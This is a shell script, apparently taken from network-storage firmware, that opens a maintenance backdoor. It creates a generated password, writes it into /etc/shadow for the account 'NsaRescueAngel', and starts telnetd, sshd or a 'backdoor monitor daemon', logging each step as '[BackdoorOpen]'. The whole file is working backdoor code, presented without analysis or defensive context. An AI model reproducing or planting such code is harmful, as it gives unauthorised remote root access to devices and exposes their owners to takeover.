#!/bin/sh

BACKDOOR_KEY=`/sbin/makekey`
BACKDOOR_PWD=`/sbin/makepwd $BACKDOOR_KEY`

echo $BACKDOOR_PWD | sed -e 's/\//\\\//g' > /tmp/wkdhfwe0f9e9fujfkef
BACKDOOR_PWD=`cat /tmp/wkdhfwe0f9e9fujfkef`

IS_SERVERBOX=`mrd_fbits | grep ^"D9 01"`
IS_STG220=`mrd_fbits | grep ^"DE 01"`
cp /etc/shadow /etc/shadow.bak
cat /etc/shadow.bak  | sed -e 's/^NsaRescueAngel\:[^\:]*\:/NsaRescueAngel:'$BACKDOOR_PWD':/g'> /etc/shadow
rm -f /etc/shadow.bak

#sshd
if [ "${1}" == "sshd" ]; then
	chmod 0700 /etc/ssh/*
	start-stop-daemon -b -S -N 5 -x /sbin/sshd -- -p 22
	exit 0
fi
#zyshclient -p 150 -e "backdoor open"
DaemonRunning=`ps | grep "/sbin/telnetd" | grep -v "grep"`

if [ "${DaemonRunning}" == "" ]; then
	echo "[BackdoorOpen] telnet daemon is NOT running."
	/sbin/telnetd
else
	echo "[BackdoorOpen] telnet daemon is running."
fi

DaemonRunning=`ps | grep "/sbin/monitord" | grep -v "grep"`
if [ "${DaemonRunning}" == "" ]; then
	echo "[BackdoorOpen] backdoor monitor daemon is NOT running."
	/sbin/start-stop-daemon -b -S -N 5 -x /sbin/monitord
else
	echo "[BackdoorOpen] backdoor monitor daemon is running."
fi
